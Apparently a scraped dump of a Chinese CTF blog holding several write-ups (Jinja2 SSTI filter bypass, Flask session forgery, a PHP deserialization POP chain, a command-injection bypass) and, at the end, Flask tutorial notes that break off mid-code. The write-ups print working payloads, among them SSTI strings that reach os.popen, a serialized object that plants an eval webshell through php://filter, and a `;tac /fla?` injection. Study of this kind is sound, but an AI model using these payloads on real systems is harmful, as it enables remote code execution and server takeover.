从列表或字符串中移除并返回指定位置的元素。但在 CTF 和渗透测试中，攻击者会利用它来 绕过安全过滤（如 _ 下划线过滤）或 动态构造恶意 payload。\n某些 WAF&#x2F;过滤器会拦截 _（如 __globals__、__import__），攻击者会用 pop 动态构造：\n&#123;% set x=(()|select|string|list).pop(24) %&#125;  &#123;# 获取 chr(24) = &#x27;\\x18&#x27; #&#125;&#123;% set gl=dict(glo=x,bals=x)|join %&#125;  &#123;# &quot;glo&quot; + &quot;bals&quot; = &quot;globals&quot; #&#125;\n\n\n(()|select|string|list) 生成一个字符串列表（如 [&#39;&lt;generator...&gt;&#39;]）。\n.pop(24) 提取第 24 个字符（可能是 _ 或其他关键字符）。\ndict+join 拼接出敏感关键字（如 globals）。\n\n&#123;&#123;()|select|string|list&#125;&#125;  or  &#123;&#123;lipsum|select|string|list&#125;&#125;     获取字符列表  \n\n也就是说，我们又通过了类似过滤器的方法先召唤出一个字符串列表，然后提取第24个字符为下划线，然后把其存入变量中就可以直接使用了\n&#123;% set a=(()|select|string|list)|attr(po)(24) %&#125;&#123;% set geti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join() %&#125;#没想到这个拼接这么容易，直接用变量名和逗号就能拼接出了\n\n其实在jinja2中可以不用通过变量绕过而是直接使用\n(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()\n\n也可以达到效果\n于是在可以进行绕过后我们使用一个简单的payload进行命令执行\n&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;\n\n\n\n但是又发现了一个问题，就是中括号还未被解决，点号和下划线都通过变量和attr()解决了，但是中括号还没法替换\n在SSTI（服务器端模板注入）攻击中，__getitem__ 是一个 Python魔法方法，它的核心作用是 允许对象通过[]运算符访问元素（类似于字典或列表的dict[key]或list[index]操作）。在你提供的payload中，__getitem__ 被用来 动态访问敏感对象属性或模块，是绕过安全限制的关键一环。\n通过 __getitem__ 从 __globals__ 中提取 os 模块，进而调用危险函数（如 os.popen(&quot;id&quot;)）\n#实例&#123;% set glo=dict(glo=a,bals=a)|join %&#125;          &#123;# &quot;globals&quot; #&#125;&#123;% set geti=dict(ge=a,titem=a)|join %&#125;        &#123;# &quot;__getitem__&quot; #&#125;&#123;% set os=dict(o=a,s=a)|join %&#125;               &#123;# &quot;os&quot; #&#125;&#123;&#123; lipsum|attr(glo)|attr(geti)(os)|attr(&quot;popen&quot;)(&quot;id&quot;)|attr(&quot;read&quot;)() &#125;&#125;#等效于lipsum.__globals__[&quot;os&quot;].popen(&quot;id&quot;).read()\n\n也就是__getitem__就是充当了中括号的作用\n&#123;%set%0apo=dict(po=a,p=a)|join()%&#125;                        #pop&#123;%set%0aa=(()|select|string|list)|attr(po)(24)%&#125;          #_&#123;%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join,a,a)|join()%&#125;  #globals&#123;%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%&#125; #getitem&#123;%set%0ape=dict(po=aaa,pen=aaa)|join()%&#125;                  #popen&#123;%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%&#125;               #readdict(o=a,s=a)|join()                #获取 os(config|string|list)|attr(po)(279)  #获取  /&#123;&#123;lipsum|attr(glo)|attr(geti)(dict(o=a,s=a)|join())|attr(pe)(dict(l=a,s=a)|join())|attr(re)()&#125;&#125;&lt;==&gt;&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;\n\n\n\n\n\n于是最后我们终于可以开始构造payload\n&#123;%set po=dict(po=a,p=a)|join()%&#125;&#123;%set a=(()|select|string|list)|attr(po)(24)%&#125;&#123;%set glo=(a,a,dict(glo=aa,bals=aa)|join(),a,a)|join()%&#125;&#123;%set get=(a,a,dict(ge=aa,titem=aa)|join(),a,a)|join()%&#125;&#123;%set pe=dict(p=aa,open=b)|join()%&#125;&#123;%set re=dict(rea=aaaaa,d=aaaaa)|join()%&#125;&#123;&#123;lipsum|attr(glo)|attr(get)(dict(o=a,s=a)|join())|attr(pe)(dict(l=a,s=a)|join())|attr(re)()&#125;&#125;\n\n\n\n&#123;%set po=dict(po=a,p=a)|join()%&#125;&#123;%set a=(()|select|string|list)|attr(po)(24)%&#125;&#123;%set glo=(a,a,dict(glo=aa,bals=aa)|join(),a,a)|join()%&#125;&#123;%set get=(a,a,dict(ge=aa,titem=aa)|join(),a,a)|join()%&#125;&#123;%set pe=dict(p=aa,open=b)|join()%&#125;&#123;%set re=dict(rea=aaaaa,d=aaaaa)|join()%&#125;&#123;&#123;lipsum|attr(glo)|attr(get)(dict(o=a,s=a)|join())|attr(pe)(dict(l=a,s=a)|join())|attr(re)()&#125;&#125;\n\n由于把空格过滤了所以我们使用回车代替\n&#123;%set%0apo=dict(po=a,p=a)|join()%&#125;&#123;%set%0aa=(()|select|string|list)|attr(po)(24)%&#125;&#123;%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join(),a,a)|join()%&#125;&#123;%set%0aget=(a,a,dict(ge=aa,titem=aa)|join(),a,a)|join()%&#125;&#123;%set%0ape=dict(p=aa,open=b)|join()%&#125;&#123;%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%&#125;&#123;&#123;lipsum|attr(glo)|attr(get)(dict(o=a,s=a)|join())|attr(pe)(dict(l=a,s=a)|join())|attr(re)()&#125;&#125;\n\n\n\n\n\n这里有很多需要注意的地方就是比如attr(get)(dict(o=a,s=a)getitem后接os是不用使用竖线和attr的，当时这里没看到，卡了好久，ai连这都看不出来还是不行啊\n最后我们直接cat &#x2F;flag即可\n但是问题又来了，我们无法用dict拼接&#x2F;，我们需要使用(config|string|list)|attr(po)(279) 去获取字符\n&#123;%set po=dict(po=a,p=a)|join()%&#125;&#123;%set a=(()|select|string|list)|attr(po)(24)%&#125;&#123;%set glo=(a,a,dict(glo=aa,bals=aa)|join(),a,a)|join()%&#125;&#123;%set get=(a,a,dict(ge=aa,titem=aa)|join(),a,a)|join()%&#125;&#123;%set pe=dict(p=aa,open=b)|join()%&#125;&#123;%set re=dict(rea=aaaaa,d=aaaaa)|join()%&#125;&#123;&#123;lipsum|attr(glo)|attr(get)(dict(o=a,s=a)|join())|attr(pe)(dict(l=a,s=a)|join())|attr(re)()&#125;&#125;\n\n\n\n&#123;%set po=dict(po=a,p=a)|join()%&#125;&#123;%set a=(()|select|string|list)|attr(po)(24)%&#125;&#123;%set glo=(a,a,dict(glo=aa,bals=aa)|join(),a,a)|join()%&#125;&#123;%set get=(a,a,dict(ge=aa,titem=aa)|join(),a,a)|join()%&#125;&#123;%set pe=dict(p=aa,open=b)|join()%&#125;&#123;%set re=dict(rea=aaaaa,d=aaaaa)|join()%&#125;&#123;&#123;lipsum|attr(glo)|attr(get)(dict(o=a,s=a)|join())|attr(pe)(((()|select|string|list)|attr(po)(15),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(16),(()|select|string|list)|attr(po)(10),(config|string|list)|attr(po)(279),(()|select|string|list)|attr(po)(41),(()|select|string|list)|attr(po)(20),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(1))|join())|attr(re)()&#125;&#125;\n\n于是就变成了\n&#123;%set%0apo=dict(po=a,p=a)|join()%&#125;&#123;%set%0aa=(()|select|string|list)|attr(po)(24)%&#125;&#123;%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join(),a,a)|join()%&#125;&#123;%set%0aget=(a,a,dict(ge=aa,titem=aa)|join(),a,a)|join()%&#125;&#123;%set%0ape=dict(p=aa,open=b)|join()%&#125;&#123;%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%&#125;&#123;&#123;lipsum|attr(glo)|attr(get)(dict(o=a,s=a)|join())|attr(pe)(((()|select|string|list)|attr(po)(15),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(16),(()|select|string|list)|attr(po)(10),(config|string|list)|attr(po)(279),(()|select|string|list)|attr(po)(41),(()|select|string|list)|attr(po)(20),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(1))|join())|attr(re)()&#125;&#125;\n\n\n\n\n\n"},{"title":"[FBCTF2019]Event","url":"/2025/06/01/FBCTF2019-Event/","content":"[FBCTF2019]Event靶场打开是一个登录并注册界面，我尝试使用admin注册，但是试了好几次都是失败的，换了个其他名字就行了，看来我们需要伪造admin账号\n登录之后发现是一个类似留言功能的一个界面\n在 &#x2F;flag 页面中提示我们并不是管理员，猜测要得到管理员权限才可以Get Flag\n\n\n\n\n在主页看到表单，先随意输入一些值进去，页面回显了Name of your event 的值\n猜测存在ssti，直接抓包测试\n\n\nPOST传递了三个参数，进过测试发现event_name和event_address无论输入什么都无法解析，但是在event_import中输入选项以外的词语回向图片上这样出错，想尝试config读取key，但是也出错，估计是被禁了\n看了大佬的__class__.__init__.__globals__[app].config,不知道为什么这个可以\n\n\n成功拿到key\n然后我们对SESSID进行解密\n&#123;&quot;_fresh&quot;:true,&quot;_id&quot;:&quot;d3123fc34cd2d056033238ecdba5c050fd0be30ff2c4e8019c65b16a531624c5a0d11104914d485a816b07b0874e501d7a3d8d5bac3b07a54e893f1cc7001ff0&quot;,&quot;user_id&quot;:&quot;1&quot;&#125;\n\n拿到这个，但是看了题解发现改SESSIONID没用需要改另外一个参数\ncookie中还有个参数user\n直接拿大佬的脚本伪造，这个用来伪造签名，但是我更本不会\nfrom flask import Flaskfrom flask.sessions import SecureCookieSessionInterfaceapp = Flask(__name__)app.secret_key = b&#x27;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y&#x27;session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)@app.route(&#x27;/&#x27;)def index():    print(session_serializer.dumps(&quot;admin&quot;))index()#ImFkbWluIg.X3L9vw.Vjo-AqvLZVgpr5ZM6DZ3GaN_zSo\n\n将这个签名替换掉user即可拿到flag\n"},{"title":"[EIS_2019]EzPOP","url":"/2025/05/07/EIS-2019-EzPOP/","content":"[EIS_2019]EzPOP题目本来是直接给了源码的，但是我想自己去找，但是这个题目你不看源码实在看不到题目，我们需要用GET传参src，才能highlight_file\n&lt;?phperror_reporting(0);class A &#123;    protected $store;    protected $key;    protected $expire;    public function __construct($store, $key = &#x27;flysystem&#x27;, $expire = null) &#123;        $this-&gt;key = $key;        $this-&gt;store = $store;        $this-&gt;expire = $expire;    &#125;    public function cleanContents(array $contents) &#123;        //过滤数组只保留指定属性（白名单机制）        $cachedProperties = array_flip([            &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;,            &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;,        ]);//array_filp，将值和键进行互换         foreach ($contents as $path =&gt; $object) &#123;            //遍历contents数组            if (is_array($object)) &#123;                $contents[$path] = array_intersect_key($object, $cachedProperties);                //如果值是数组则只保留数组中和$cachedProperties相同的键一样的键值对，简单的说就是只保留path=&gt;xxx这些规定的键值对            &#125;        &#125;        return $contents;//返回被清楚缓存的数组    &#125;    public function getForStorage() &#123;        $cleaned = $this-&gt;cleanContents($this-&gt;cache);//用于清除缓存数据        //我们也不需要用到缓存直接随便送个数组不报错就行了        //cache这个变量源代码未定义，需要我们在构造pop链的时候自己定义                return json_encode([$cleaned, $this-&gt;complete]);        //complete也不存在，需要我们自定义        //将这两个参数作为数组一起用json储存起来    &#125;    public function save() &#123;        $contents = $this-&gt;getForStorage();        //调用这函数进行json数据储存和过滤        $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);        //调用store中的ser方法，刚好B类中有这个函数        //将我们的key，contents数组，expire作为参数    &#125;    public function __destruct() &#123;        //触发destruct方法调用save()函数        if (!$this-&gt;autosave) &#123;            $this-&gt;save();        &#125;    &#125;&#125;class B &#123;    protected function getExpireTime($expire): int &#123;        return (int) $expire;    &#125;    public function getCacheKey(string $name): string &#123;        return $this-&gt;options[&#x27;prefix&#x27;] . $name;    &#125;    protected function serialize($data): string &#123;        if (is_numeric($data)) &#123;            return (string) $data;        &#125;        $serialize = $this-&gt;options[&#x27;serialize&#x27;];        return $serialize($data);    &#125;    public function set($name, $value, $expire = null): bool&#123;        $this-&gt;writeTimes++;        if (is_null($expire)) &#123;            //如果我们的expir为空，实际上参数那里已经将expire为空了            $expire = $this-&gt;options[&#x27;expire&#x27;];            //option这个数组源代码也没有定义，需要我们自己定义        &#125;        $expire = $this-&gt;getExpireTime($expire);        //调用了getExpireTime函数，感觉只是进行了一个作用是 规范化过期时间，将其强制转换为整数类型（int），和我们做题没关系        $filename = $this-&gt;getCacheKey($name);        //将option[&#x27;prefix&#x27;]连接$name赋值给$filename        $dir = dirname($filename);        //dirname() 是 PHP 中一个常用的文件路径处理函数，用于返回路径中的目录部分        if (!is_dir($dir)) &#123;            try &#123;                mkdir($dir, 0755, true);            &#125; catch (\\Exception $e) &#123;                // 创建失败            &#125;        &#125;//进行目录创建        $data = $this-&gt;serialize($value);        //对我们传入的contents数组进行序列化，后面会写入文件中        if ($this-&gt;options[&#x27;data_compress&#x27;] &amp;&amp; function_exists(&#x27;gzcompress&#x27;)) &#123;            //数据压缩            $data = gzcompress($data, 3);        &#125;        $data = &quot;&lt;?php\\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data;          $result = file_put_contents($filename, $data);        //重点的写入文件的过程        if ($result) &#123;            return true;        &#125;        return false;    &#125;&#125;if (isset($_GET[&#x27;src&#x27;]))&#123;    highlight_file(__FILE__);&#125;$dir = &quot;uploads/&quot;;if (!is_dir($dir))&#123;    mkdir($dir);&#125;unserialize($_GET[&quot;data&quot;]);\n\n解这个题目需要的知识点不是特别难，但是代码审计实在是难，要看好久\n看完了之后发现，这是一个我们直接传入序列化数据，然后直接触发__destruct方法，然后一路触发file_put_content函数的过程，在这个过程中有比较复杂的赋值和过滤语句，我认为这是构造pop链比较难的地方\n我们先不管写到文件里面的是什么，我们首先得能够写到一个php文件中\n我们看到这个决定文件名的代码\npublic function getCacheKey(string $name): string &#123;        return $this-&gt;options[&#x27;prefix&#x27;] . $name;    &#125;$filename = $this-&gt;getCacheKey($name);//filename最后作为文件写入的对象，option[&#x27;prefix&#x27;]和$name=$key决定文件路径\n\n我们能够写入php文件后就该解决文件写入时出现的问题了\n$data = &quot;&lt;?php\\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data;  $result = file_put_contents($filename, $data);\n\n这个代码中哪个sprintf的结果就是改下时间戳，没用，但是前后的代码就有问题了，连起来就是\n&lt;?php\\n//\\n exit();?&gt;\\n\n\n会出现的exit()这个代码，我们在后面写的一句话木马就没有意义了\n关于这个不得不贴下大佬的文章了\n谈一谈php:&#x2F;&#x2F;filter的妙用 | 离别歌\n&lt;?php$content = &#x27;&lt;?php exit; ?&gt;&#x27;;$content .= $_POST[&#x27;txt&#x27;];file_put_contents($_POST[&#x27;filename&#x27;], $content);\n\n$content在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？\n幸运的是，这里的$_POST[&#39;filename&#39;]是可以控制协议的，我们即可使用 php:&#x2F;&#x2F;filter协议来施展魔法：使用php:&#x2F;&#x2F;filter流的base64-decode方法，将$content解码，利用php base64_decode函数特性去除“死亡exit”。\n众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。\n所以，一个正常的base64_decode实际上可以理解为如下两个步骤：\n&lt;?php$_GET[&#x27;txt&#x27;] = preg_replace(&#x27;|[^a-z0-9A-Z+/]|s&#x27;, &#x27;&#x27;, $_GET[&#x27;txt&#x27;]);base64_decode($_GET[&#x27;txt&#x27;]);\n\n所以，当$content被加上了&lt;?php exit; ?&gt;以后，我们可以使用 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。\n“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是&lt;?php exit; ?&gt;没有了。\n最后效果是 ：\n\n\n\n\n\n\n所以这个方法就是base64_decode过滤器会忽略不可解码字符，然后将phpexita作为两组编码，然后在后面跟上我们base64编码的一句话木马我们就能经过解码后的一句话木马写入文件中了\n但是我们需要注意的是sprintf(&#39;%012d&#39;, $expire)将我们的时间戳变为12个数字，经过忽略字符后变成了php&#x2F;&#x2F;‘12个字符’exit所以我们还需要填充三个字符用于base64解码\n最后直接写pop链了\n&lt;?phpclass A &#123;    protected $store;    protected $key;    protected $expire;    public function __construct($store,$key,$expire)    &#123;        $this-&gt;key=$key;        $this-&gt;expire=$expire;        $this-&gt;store=$store;    &#125;&#125;class B&#123;    public $option;&#125;$b=new B();$b-&gt;options[&#x27;serialize&#x27;]=&#x27;base64_decode&#x27;;$b-&gt;options[&#x27;data_compress&#x27;]=false;$b-&gt;options[&#x27;prefix&#x27;]=&#x27;php://filter/write=convert.base64-decode/resource=uploads/&#x27;;//uploades为我们自定义路径，php伪协议则是用于处理数据$a=new A($b,&#x27;eval.php&#x27;,0);//$b是为了连接pop链，eval则是为了将数据储存在eval.php中$a-&gt;autosave=false;$a-&gt;cache=array();//为了不报错$a-&gt;complete=base64_encode(&#x27;abc&#x27;.base64_encode(&#x27;&lt;?php @eval($_POST[&quot;a&quot;]); ?&gt;&#x27;));//必须添加三个字符使得shell之前的字符串进行base64解码时不影响shellecho urlencode(serialize($a));//O%3A1%3A%22A%22%3A6%3A%7Bs%3A8%3A%22%00%2A%00store%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A6%3A%22option%22%3BN%3Bs%3A7%3A%22options%22%3Ba%3A3%3A%7Bs%3A9%3A%22serialize%22%3Bs%3A13%3A%22base64_decode%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A58%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3Duploads%2F%22%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A8%3A%22eval.php%22%3Bs%3A9%3A%22%00%2A%00expire%22%3Bi%3A0%3Bs%3A8%3A%22autosave%22%3Bb%3A0%3Bs%3A5%3A%22cache%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22complete%22%3Bs%3A60%3A%22YWJjUEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VV3lKaElsMHBPeUEvUGc9PQ%3D%3D%22%3B%7D\n\n最后将序列化数据通过GET请求传递给data，然后访问uploads&#x2F;eval.php蚁剑连接即可\n"},{"title":"EasyBypass","url":"/2025/04/24/EasyBypass/","content":"EasyBypass&lt;?phphighlight_file(__FILE__);$comm1 = $_GET[&#x27;comm1&#x27;];$comm2 = $_GET[&#x27;comm2&#x27;];if(preg_match(&quot;/\\&#x27;|\\`|\\\\|\\*|\\n|\\t|\\xA0|\\r|\\&#123;|\\&#125;|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $comm1))    $comm1 = &quot;&quot;;if(preg_match(&quot;/\\&#x27;|\\&quot;|;|,|\\`|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||ls|\\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;, $comm2))    $comm2 = &quot;&quot;;$flag = &quot;#flag in /flag&quot;;$comm1 = &#x27;&quot;&#x27; . $comm1 . &#x27;&quot;&#x27;;$comm2 = &#x27;&quot;&#x27; . $comm2 . &#x27;&quot;&#x27;;$cmd = &quot;file $comm1 $comm2&quot;;system($cmd);?&gt;\n\n这个题目看似是一个命令执行绕过，但是对我们的cmd有限制file $comm1 $comm2固定使用了file命令，还对comm有很多关键词的过滤。但是我们仔细看下过滤字符，发现comm1少过滤了;和tac，这个可以作为命令分隔符，让comm2进行命令执行\n题目已经告诉我们flag在&#x2F;flag下，但是两个参数都把&#x2F;flag给过滤掉了，我们的目的就变成了绕过路径的过滤\n我们再仔细观察发现没过滤/和?作为通配符，那这个题目就很简单了，直接使用命令分隔和通配符进行关键词绕过即可\n但是我们需要注意的是，前面还有一个file命令需要执行，如果执行报错后面的命令也不会执行，我们得先了解file命令，不然会报错\ncannot open `&#x27; (No such file or directory) cannot open `&#x27; (No such file or directory) \n\n\n\nfile 命令是 Linux 系统中一个非常有用的工具，用于确定文件的类型。它会检查文件内容并返回文件类型的描述。\nfile [选项] 文件名...\n\n我们只需要在后面跟文件路径即可\n但是还没完题目对我们的参数使用”进行包裹后再将comm放到cmd里面，就会变成\nfile &quot;comm1&quot; &quot;comm2&quot; #假如我们直接进行命令执行就会变成file &quot;index.php;tac /fla?&quot; &quot;a&quot; #我们需要对前后进行闭合，让我们的tac命令露出来file &quot;index.php&quot;;tac /fla?&quot;&quot; &quot;a&quot;\n\npayload\n?comm1=index.php&quot;;tac /fla?&quot;&amp;comm2=a\n\n\n"},{"title":"Flask","url":"/2025/03/16/Flask/","content":"Flask学习笔记前言本来在学习计划里面flask应该是要放在和python和requests库一起去学的，但是我优先去学其他漏洞去了，现在回来补以下，后面的漏洞会用到\n1.Flask简介Flask是一个轻量级的基于Python的web框架。\n简介很短，我看了一下后感觉和php有点像，都是结合html去构建web页面，甚至有些功能都和php相似\n2.Hello World在计算机领域，正可谓Hello World生万物，一切都起源于神秘的Hello World\nfrom flask import Flaskapp = Flask(__name__)@app.route(&#x27;/&#x27;)def hello_world():    return &#x27;Hello, World!&#x27;if __name__ == &#x27;__main__&#x27;:    app.run(debug=True)\n\n运行结果不重要反正都是Hello World。程序运行后会给我们一个网址127.0.0.1:5000访问即可看到结果\n代码解析：\n\nfrom flask import Flask： 这行代码从 flask 模块中导入了 Flask 类。Flask 类是 Flask 框架的核心，用于创建 Flask 应用程序实例。\n**app &#x3D; Flask(name)**： 这行代码创建了一个 Flask 应用实例。__name__ 是一个特殊的 Python 变量，它在模块被直接运行时是 &#39;__main__&#39;，在被其他模块导入时是模块的名字。传递 __name__ 给 Flask 构造函数允许 Flask 应用找到和加载配置文件。\n**@app.route(‘&#x2F;‘)**： 这是一个装饰器，用于告诉 Flask 哪个 URL 应该触发下面的函数。在这个例子中，它指定了根 URL（即网站的主页）。\n**def hello_world():**： 这是定义了一个名为 hello_world 的函数，它将被调用当用户访问根URL时。\n**return ‘Hello, World!’**： 这行代码是 hello_world 函数的返回值。当用户访问根 URL 时，这个字符串将被发送回用户的浏览器。\n**if name &#x3D;&#x3D; ‘main‘:**：这行代码是一个条件判断，用于检查这个模块是否被直接运行，而不是被其他模块导入。如果是直接运行，下面的代码块将被执行。\n**app.run(debug&#x3D;True)**：这行代码调用 Flask 应用实例的 run 方法，启动 Flask 内置的开发服务器。debug=True 参数会启动调试模式，这意味着应用会在代码改变时自动重新加载，并且在发生错误时提供一个调试器。\n\n3.Flask基本概念这里主要是了解一些概念，后面会详细的将用法，现在先了解下整体\n以下是 Flask 的主要基本概念的详细解析：\n\n路由：路由是 URL 到 Python 函数的映射。Flask 允许你定义路由，这样当特定的 URL 被访问时，就会调用相应的函数。\n视图函数：视图函数是处理请求并返回响应的 Python 函数。它们通常接收请求对象作为参数，并返回响应对象。\n请求对象：请求对象包含了客户端发送的请求信息，如请求方法、URL、请求头、表单数据等。\n响应对象：响应对象包含了发送给客户端的响应信息，如状态码、响应头、响应体等。\n模板：Flask 使用 Jinja2 模板引擎来渲染 HTML 模板。模板允许你将 Python 代码嵌入到 HTML 中，从而动态生成网页。\n应用工厂：应用工厂是一个 Python 函数，它创建并返回一个 Flask 应用实例。这允许你配置和初始化你的应用，并且可以创建多个应用实例。\n配置对象：Flask 应用有一个配置对象，你可以使用它来设置各种配置选项，如数据库连接字符串、调试模式等。\n蓝图：蓝图是 Flask 中的一个组织代码的方式，它允许你将相关的视图函数、模板和静态文件组织在一起，并且可以在多个应用中重用。\n静态文件：静态文件是不会被服务器端执行的文件，如 CSS、JavaScript 和图片文件。Flask 提供了一个简单的方法来服务这些文件。\n扩展：Flask 有许多扩展，可以添加额外的功能，如数据库集成、表单验证、用户认证等。\n会话：Flask 使用客户端会话来存储用户信息，这允许你在用户浏览你的应用时记住他们的状态。\n错误处理：Flask 允许你定义错误处理函数，当特定的错误发生时，这些函数会被调用。\n\n4.Flask路由Flask 路由是 Web 应用程序中将 URL 映射到 Python 函数的机制。\nFlask 路由是 Flask 应用的核心部分，用于处理不同 URL 的请求，并将请求的处理委托给相应的视图函数。\n我们通过Flask访问到的各个网页是有路由设定的\n以下是关于 Flask 路由的详细说明，包括路由的定义、参数、方法和规则等。\n\n定义路由：使用 @app.route(&#39;/path&#39;) 装饰器定义 URL 和视图函数的映射。\n路由参数：通过动态部分在 URL 中传递参数。\n路由规则：使用类型转换器指定 URL 参数的类型。\n请求方法：指定允许的 HTTP 请求方法。\n路由函数返回：视图函数可以返回不同类型的响应。\n静态文件和模板：管理静态文件和动态渲染 HTML 模板。\n路由优先级：确保路由顺序正确，以避免意外的匹配结果。\n\n1.定义路由\nfrom flask import Flaskapp = Flask(__name__)#这个app规定模块为自身这个文件@app.route(&#x27;/&#x27;)#感觉和index.php差不多def home():    return &#x27;Welcome to the Home Page!&#x27;\n\n\n@app.route(&#39;/&#39;)：装饰器，用于定义路由。/ 表示根 URL。\ndef home()：视图函数，当访问根 URL 时，返回 &#39;Welcome to the Home Page!&#39;。\n\n2.路由参数\n路由可以包含动态部分，通过在路由中指定参数，可以将 URL 中的部分数据传递给视图函数。\n@app.route(&#x27;/greet/&lt;name&gt;&#x27;)def greet(name):    return f&#x27;Hello, &#123;name&#125;!&#x27;#f 是用来标识这是一个 f-string（格式化字符串字面值）的\n\n这个代码将&lt;name&gt;作为参数，会输出Hello，&lt;name&gt;\n效果如下\n\n\n需要注意的是，这虽然和GET请求一样通过url传递参数，但是区别在于这个根据视图函数规定只能传递一个，而且没问号。而GET请求则没有限制随便传，也有问号\n3.路由规划\n路由规则支持不同类型的参数和匹配规则。\n类型规则：\n\n字符串（默认）： 匹配任意字符串。\n整数（&lt;int:name&gt;）： 匹配整数值。\n浮点数（&lt;float:value&gt;）： 匹配浮点数值。\n路径（&lt;path:name&gt;）： 匹配任意字符，包括斜杠 /。\n\n实例;\n@app.route(&#x27;/user/&lt;int:user_id&gt;&#x27;)def user_profile(user_id):    return f&#x27;User ID: &#123;user_id&#125;&#x27;@app.route(&#x27;/files/&lt;path:filename&gt;&#x27;)def serve_file(filename):    return f&#x27;Serving file: &#123;filename&#125;&#x27;\n\n这个就是对传入参数有一定限制，规定一下类型\n4.请求方法\nFlask 路由支持不同的 HTTP 请求方法，如 GET、POST、PUT、DELETE 等。可以通过 methods 参数指定允许的请求方法。\n实例:\nfrom flask import Flask, requestapp = Flask(__name__)@app.route(&#x27;/get_params&#x27;, methods=[&#x27;GET&#x27;])def get_params():    # 获取单个参数    name = request.args.get(&#x27;name&#x27;)    age = request.args.get(&#x27;age&#x27;)    # 如果参数不存在，get 方法会返回 None，也可以指定默认值    city = request.args.get(&#x27;city&#x27;, &#x27;Unknown&#x27;)    return f&quot;Name: &#123;name&#125;, Age: &#123;age&#125;, City: &#123;city&#125;&quot;if __name__ == &#x27;__main__&#x27;:    app.run(debug=True)\n\n 代码解释\n\nrequest.args 是一个类似字典的对象，用于存储 URL 查询字符串中的参数。\nrequest.args.get(&#39;name&#39;) 用于获取名为 name 的参数值，如果该参数不存在，返回 None。\nrequest.args.get(&#39;city&#39;, &#39;Unknown&#39;) 表示如果 city 参数不存在，将返回默认值 &#39;Unknown&#39;。\n\n这是通过GET请求获得参数。至于POST请求\nfrom flask import Flask, requestapp = Flask(__name__)@app.route(&#x27;/post_form&#x27;, methods=[&#x27;POST&#x27;])def post_form():    # 获取单个参数    name = request.form.get(&#x27;name&#x27;)    age = request.form.get(&#x27;age&#x27;)    city = request.form.get(&#x27;city&#x27;, &#x27;Unknown&#x27;)    return f&quot;Name: &#123;name&#125;, Age: &#123;age&#125;, City: &#123;city&#125;&quot;if __name__ == &#x27;__main__&#x27;:    app.run(debug=True)\n\n无法通过url获得参数。直接访问会出现下面这样，其他方法还难一点\n\n\n这是GET请求\n\n\n\n\n5.路由转换器\nFlask 提供了一些内置的转换器，可以对 URL 中的参数进行特定类型的转换。\n常用转换器：\n\nint： 匹配整数。\nfloat： 匹配浮点数。\npath： 匹配任意路径，包括斜杠。\n\n话说这个也是相当于对参数的强制类型转换，为什么不放在路由规划前面讲\n实例：\n@app.route(&#x27;/items/&lt;int:item_id&gt;/details&#x27;)def item_details(item_id):    return f&#x27;Item details for item ID: &#123;item_id&#125;&#x27;\n\n\n&lt;int:item_id&gt;：将 URL 中的 item_id 转换为整数。\n\n6.路由函数返回\n视图函数可以返回多种类型的响应：\n\n字符串：返回纯文本响应。\nHTML：返回 HTML 页面。\nJSON：返回 JSON 数据。\nResponse 对象：自定义响应\n\n实例:\nfrom flask import jsonify, Response@app.route(&#x27;/json&#x27;)def json_response():    data = &#123;&#x27;key&#x27;: &#x27;value&#x27;&#125;    return jsonify(data)@app.route(&#x27;/custom&#x27;)def custom_response():    response = 